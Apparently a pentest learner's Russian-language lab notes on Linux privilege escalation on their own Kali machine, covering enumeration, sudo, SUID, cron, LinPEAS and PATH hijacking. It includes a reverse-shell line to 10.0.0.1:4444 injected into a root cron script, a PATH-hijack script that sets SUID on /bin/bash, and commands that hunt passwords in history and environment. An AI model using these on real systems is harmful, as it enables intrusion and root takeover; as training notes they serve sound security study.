# День 16 — Linux Privilege Escalation (PrivEsc)
**Дата:** 2026-05-03
**Платформа:** Kali Linux (локальная система)

---

## Что такое PrivEsc?

```
Privilege Escalation = повышение привилегий

www-data (uid=33) → root (uid=0)

Вертикальный:    низкий пользователь → root
Горизонтальный:  user1 → user2 (тот же уровень, другой аккаунт)
```

Почему важно: после получения веб-шелла (День 12) ты обычно
заходишь как www-data. Root нужен для чтения /etc/shadow,
установки backdoor и полного контроля над системой.

---

## Часть 1 — Local Enumeration (разведка изнутри)

### Команды первого запуска после получения шелла:

```bash
# Кто я?
id && whoami

# Какая система?
uname -a
cat /etc/os-release

# Что могу делать через sudo?
sudo -l

# Пользователи с шеллом
cat /etc/passwd | grep -v nologin | grep -v false

# Мои группы
groups

# Домашние директории
ls -la /home/

# История команд (часто там пароли!)
cat ~/.bash_history
cat ~/.zsh_history

# Процессы от root
ps aux | grep root

# Открытые порты изнутри
netstat -tulnp 2>/dev/null || ss -tulnp

# Переменные окружения (пароли в env!)
env
```

### Результаты на нашей системе:

```
uid=1000(kali) gid=1000(kali) groups=sudo ← в группе sudo!
OS: Kali GNU/Linux 2026.1 Rolling
Ядро: Linux 6.19.11+kali-amd64
sudo -l → (ALL : ALL) ALL ← КРИТИЧНО!
Пользователи с шеллом: root, postgres, kali
Порты внутри: 127.0.0.1:9050 (Tor), 127.0.0.1:34471
```

---

## Часть 2 — Sudo PrivEsc (наш случай!)

### Самый лёгкий вектор:

```bash
# Если sudo -l показывает (ALL:ALL) ALL
sudo su -
# или
sudo bash

# Результат:
id → uid=0(root) gid=0(root) groups=0(root) ✅
```

**Правило:** `sudo -l` — ПЕРВОЕ что проверяем после получения шелла.

---

## Часть 3 — SUID бинарники

### Найти все SUID файлы:
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null | grep -v snap | grep -v proc
```

### Что такое SUID:
```
-rwsr-xr-x root root /usr/bin/passwd
  ^^^
  s = SUID бит → файл запускается с правами ВЛАДЕЛЬЦА (root)
  не с правами текущего пользователя!
```

### Найденные SUID на нашей системе:
```
/usr/bin/pkexec    ← CVE-2021-4034 PwnKit (v127 = пропатчен!)
/usr/bin/sudo      ← нормально
/usr/sbin/exim4    ← почтовый сервер, проверить версию
/usr/bin/at        ← планировщик задач
/usr/bin/newgrp    ← есть GTFOBins техника
/usr/bin/passwd    ← нормально
```

### GTFOBins — главный ресурс:
```
https://gtfobins.github.io/
База данных Unix бинарников для PrivEsc через SUID/sudo
```

---

## Часть 4 — Cron Jobs

### Разведка cron:
```bash
cat /etc/crontab
ls -la /etc/cron*
find /etc/cron* -writable 2>/dev/null
```

### Атака через writable cron (теория):
```bash
# Если /opt/backup.sh запускается от root каждую минуту
# И файл принадлежит нам → пишем reverse shell:
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /opt/backup.sh
# Через минуту → root reverse shell!
```

### Результат на нашей системе:
```
Все cron файлы: -rw-r--r-- root root
Writable cron файлов = 0 ← вектор закрыт
```

---

## Часть 5 — LinPEAS автоматизация

### Установка и запуск:
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \
  -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt

# Смотрим критические находки
grep -E "95%|NOPASSWD|password|sudo|SUID|writable|Interesting" \
  /tmp/linpeas_output.txt | head -40
```

### Легенда цветов LinPEAS:
```
🔴 RED/YELLOW = 95% вектор PrivEsc → смотреть первым!
🔴 RED        = стоит проверить
🩵 LightCyan  = пользователи с консолью
🟢 Green      = обычные вещи
```

### Что нашёл LinPEAS на нашей системе:
```
🔴 PATH HIJACKING (writable path abuse):
   /home/kali/.local/bin и /home/kali/.dotnet/tools
   находятся в $PATH и доступны для записи!
   → Если root запускает команду без полного пути
     мы можем подменить её своим скриптом

🟡 Sudo version 1.9.17p2 → проверить CVE
✅ fping, bash, nc, nmap — доступны для pivot
```

### PATH Hijacking атака (теория):
```bash
# Если root запускает просто "python" (без /usr/bin/python)
# И /home/kali/.local/bin в начале PATH

# Создаём поддельный python:
echo '#!/bin/bash' > /home/kali/.local/bin/python
echo 'chmod +s /bin/bash' >> /home/kali/.local/bin/python
chmod +x /home/kali/.local/bin/python

# Когда root запустит "python" → выполнится наш скрипт!
# /bin/bash получит SUID бит
# bash -p → root shell
```

---

## Итоговая таблица векторов PrivEsc

| Вектор | Команда | Результат |
|--------|---------|-----------|
| **sudo (ALL:ALL)** | `sudo su -` | ✅ root мгновенно |
| SUID pkexec | CVE-2021-4034 | ❌ v127 пропатчен |
| SUID at | GTFOBins | 🟡 /bin/sh не root |
| Writable cron | модифицируем скрипт | ❌ все root:root |
| PATH Hijacking | подменяем бинарник | 🟡 нужен доп. условие |
| Kernel exploit | searchsploit | ⚠️ последний вариант |

---

## Порядок PrivEsc в реальных пентестах:

```
1. sudo -l           → самый быстрый путь к root
2. LinPEAS           → автоматически находит остальное
3. SUID + GTFOBins   → если sudo не работает
4. Writable cron     → если есть writable скрипты от root
5. PATH Hijacking    → если PATH содержит writable директории
6. Kernel exploits   → последний вариант (нестабильно!)
```

---

## Инструменты дня

| Инструмент | Команда | Что делает |
|-----------|---------|------------|
| id / whoami | `id` | показывает текущего пользователя и группы |
| sudo -l | `sudo -l` | показывает sudo права |
| find SUID | `find / -perm -u=s -type f 2>/dev/null` | ищет SUID бинарники |
| LinPEAS | `/tmp/linpeas.sh` | автоматизирует всю PrivEsc разведку |
| GTFOBins | gtfobins.github.io | база техник для SUID/sudo |
| sudo su - | `sudo su -` | повышение до root через sudo |
